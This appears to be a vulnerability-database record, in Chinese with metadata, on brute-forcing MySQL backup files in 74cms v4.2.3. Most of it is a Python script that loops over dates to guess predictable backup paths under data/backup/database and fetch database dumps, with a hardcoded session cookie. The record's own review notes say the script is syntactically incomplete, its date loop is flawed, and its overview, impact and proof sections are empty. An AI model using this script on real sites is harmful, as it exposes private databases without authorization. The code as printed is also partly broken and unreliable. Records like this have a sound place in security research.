---
source: "hatch 补库批 20260928"
product: "74cms"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "74cms v4.2.3 备份文件爆破"
prerequisites: "来源所述条件，未列明部分仍待核：4.2.3 in title; predictable publicly accessible backup naming; backup must exist"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-6afe71eb890a69730d06d92b"
entity_id: "ve-6afe71eb890a69730d06d92b"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：4.2.3 in title; predictable publicly accessible backup naming; backup must exist

- **结论使用边界（1）**：Unquoted separator/header before lone triple quote makes supplied Python text syntactically incomplete。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：Date loop excludes day31 and ends at2019; not general current search。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **凭据与会话边界（3）**：Hardcoded session cookie is not explained; no evidence whether auth needed。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **证据待核（4）**：Overview, impact, response proof, original reference absent。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 74cms v4.2.3 备份文件爆破

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

    # -*- coding: utf-8 -*-
    -------------------------------------------------
       File Name：     74cms_MysqlBak
       Description :
       Author :       CoolCat
       date：          2019/1/5
    -------------------------------------------------
       Change Activity:
                       2019/1/5:
    -------------------------------------------------
    """
    __author__ = 'CoolCat'

    import requests

    def getBak(time):
        print("[running]:正在查询" + time + "是否存在备份")
        dir = time + "_1"
        filename = dir + "_1.sql"
        url = target + "//data/backup/database/" + dir +"/"+ filename
        session = requests.Session()
        headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0",
                   "Connection": "close", "Accept-Language": "en", "Accept-Encoding": "gzip, deflate"}
        cookies = {"think_language": "en", "think_template": "default", "PHPSESSID": "6d86a34ec9125b2d08ebbb7630838682"}
        response = session.get(url=url, headers=headers, cookies=cookies)
        if response.status_code == 200:
            print(url)
            exit()

    if __name__ == '__main__':

        global target
        target = "http://www.target.com"

        for year in range(2017, 2020):
            for mouth in range(1, 13):
                for day in range(1, 31):
                    time = (str(year) + str('%02d' % mouth) + str('%02d' % day))
                    getBak(time)
